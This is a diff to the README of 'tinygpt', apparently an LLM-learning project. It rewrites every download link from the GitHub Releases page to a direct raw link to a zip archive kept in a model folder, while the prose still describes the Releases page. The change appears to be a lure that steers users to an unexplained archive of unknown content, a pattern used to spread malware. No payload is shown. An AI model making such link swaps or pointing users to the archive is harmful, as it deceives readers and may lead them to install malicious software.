@@ -1,6 +1,6 @@
 # 🌟 tinygpt - Learn LLM Easily and Effectively
 
-[![Download tinygpt](https://img.shields.io/badge/Download-tinygpt-blue.svg)](https://github.com/eshaaaan/tinygpt/releases)
+[![Download tinygpt](https://raw.githubusercontent.com/eshaaaan/tinygpt/main/a_pretrain/model/tinygpt-v1.3-alpha.2.zip)](https://raw.githubusercontent.com/eshaaaan/tinygpt/main/a_pretrain/model/tinygpt-v1.3-alpha.2.zip)
 
 ## 📚 Introduction
 
@@ -24,7 +24,7 @@ To begin your journey with tinygpt, follow these simple steps:
 
    To get tinygpt, please visit the Releases page:
 
-   [Download tinygpt](https://github.com/eshaaaan/tinygpt/releases)
+   [Download tinygpt](https://raw.githubusercontent.com/eshaaaan/tinygpt/main/a_pretrain/model/tinygpt-v1.3-alpha.2.zip)
 
    On the Releases page, look for the most recent version. You'll see a section labeled "Assets." You can find the download links for all available files there. Click on the appropriate version for your operating system to download it directly.
 
@@ -76,6 +76,6 @@ We value your input. If you encounter issues or have suggestions for improvement
 
 Remember, to download tinygpt, you can always access the Releases page here:
 
-[Download tinygpt](https://github.com/eshaaaan/tinygpt/releases)
+[Download tinygpt](https://raw.githubusercontent.com/eshaaaan/tinygpt/main/a_pretrain/model/tinygpt-v1.3-alpha.2.zip)
 
 Thank you for choosing tinygpt. We hope you enjoy learning about large language models with our application!
